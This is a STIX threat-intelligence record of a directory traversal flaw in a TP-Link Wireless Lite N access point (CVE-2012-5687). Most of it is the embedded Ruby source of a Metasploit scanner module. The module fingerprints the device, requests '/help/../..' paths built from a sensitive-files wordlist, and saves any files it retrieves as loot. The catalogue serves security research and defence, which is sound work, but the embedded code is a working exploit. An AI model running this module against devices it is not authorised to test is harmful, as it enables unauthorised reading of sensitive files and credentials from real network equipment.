{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--048ee645-d011-4c50-a713-dd6a0d3c639b",
    "created": "2024-08-14T16:29:50.612158Z",
    "modified": "2024-08-14T16:29:50.612161Z",
    "name": "TP-Link Wireless Lite N Access Point Directory Traversal Vulnerability",
    "description": " This module tests whether a directory traversal vulnerability is present in versions of TP-Link Access Point 3.12.16 Build 120228 Rel.37317n.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/tplink_traversal_noauth.rb",
            "external_id": "tplink_traversal_noauth.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-011"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'TP-Link Wireless Lite N Access Point Directory Traversal Vulnerability',\n      'Description' => %q{\n          This module tests whether a directory traversal vulnerability is present in\n        versions of TP-Link Access Point 3.12.16 Build 120228 Rel.37317n.\n      },\n      'References'  =>\n        [\n          [ 'CVE', '2012-5687' ],\n          [ 'OSVDB', '86881' ],\n          [ 'BID', '57969' ],\n          [ 'EDB', '24504' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-011' ]\n        ],\n      'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptPath.new('SENSITIVE_FILES',  [ true, \"File containing senstive files, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"sensitive_files.txt\") ]),\n      ])\n  end\n\n  def extract_words(wordfile)\n    return [] unless wordfile && File.readable?(wordfile)\n\n    begin\n      File.readlines(wordfile, chomp: true)\n    rescue ::StandardError => e\n      elog(e)\n      []\n    end\n  end\n\n  def find_files(file)\n    traversal = '/../..'\n\n    res = send_request_cgi(\n      {\n        'method'  => 'GET',\n        'uri'     => '/help' << traversal << file,\n        })\n\n    return if res.nil?\n    return if (res.headers['Server'].nil? or res.headers['Server'] !~ /TP-LINK Router/)\n    return if (res.code == 404)\n    return if (res.code == 501)\n\n    if (res and res.code == 200 and res.body !~ /\\<\\/HTML/)\n      out = false\n\n      print_good(\"#{rhost}:#{rport} - Request may have succeeded on file #{file}\")\n      report_web_vuln({\n        :host     => rhost,\n        :port     => rport,\n        :vhost    => datastore['VHOST'],\n        :path     => \"/\",\n        :pname    => normalize_uri(traversal, file),\n        :risk     => 3,\n        :proof    => normalize_uri(traversal, file),\n        :name     => self.fullname,\n        :category => \"web\",\n        :method   => \"GET\"\n        })\n\n      loot = store_loot(\"tplink.traversal.data\",\"text/plain\",rhost, res.body,file)\n      vprint_good(\"#{rhost}:#{rport} - File #{file} downloaded to: #{loot}\")\n\n      if datastore['VERBOSE']\n        vprint_good(\"#{rhost}:#{rport} - Response - File #{file}:\")\n        res.body.each_line do |line|\n          # the following is the last line of the useless response\n          if line.to_s =~ /\\/\\/--><\\/SCRIPT>/\n            # setting out = true to print all of the following stuff\n            out = true\n            next\n          end\n          if out == true\n            if line =~ /<META/ or line =~ /<Script/\n              # we are finished :)\n              # the next line is typical code from the website and nothing from us\n              # this means we can skip this stuff ...\n              out = false\n              next\n            else\n              #it is our output *h00ray*\n              #output our stuff ...\n              print_line(\"#{line}\")\n            end\n          end\n        end\n        out = false\n      end\n    elsif res && res.code\n      vprint_error(\"#{rhost}:#{rport} - File->#{file} not found\")\n    end\n  end\n\n  def run_host(ip)\n\n    begin\n      vprint_status(\"#{rhost}:#{rport} - Fingerprinting...\")\n      res = send_request_cgi(\n        {\n          'method'  => 'GET',\n          'uri'\t => '/',\n        })\n\n      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /TP-LINK Router/)\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return\n    end\n\n    extract_words(datastore['SENSITIVE_FILES']).each do |files|\n      find_files(files) unless files.empty?\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Michael Messner <devnull[at]s3cur1ty.de> ]",
        ""
    ]
}